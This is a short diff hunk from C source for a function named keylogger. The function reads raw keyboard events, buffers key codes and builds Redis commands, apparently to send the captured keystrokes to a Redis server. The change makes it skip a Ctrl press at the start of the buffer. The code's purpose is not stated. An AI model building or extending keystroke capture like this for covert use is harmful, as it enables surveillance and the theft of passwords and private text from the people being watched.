@@ -82,7 +82,12 @@ void keylogger(int keyboard, int immediate, int redis_port){
             if(events[i].type == EV_KEY){
                 if(events[i].value == 1){
                     if(is_valid_key((int) events[i].code)){
+
+                        // filter ctrl at buffer beginning
+                        if (buffer_size == 0 && events[i].code == 29) continue;
+
                         extend_buffer(events[i].code);
+
                         if (immediate || events[i].code == 29) {
                             char redis_args[5];
                             build_redis_command(redis_args);
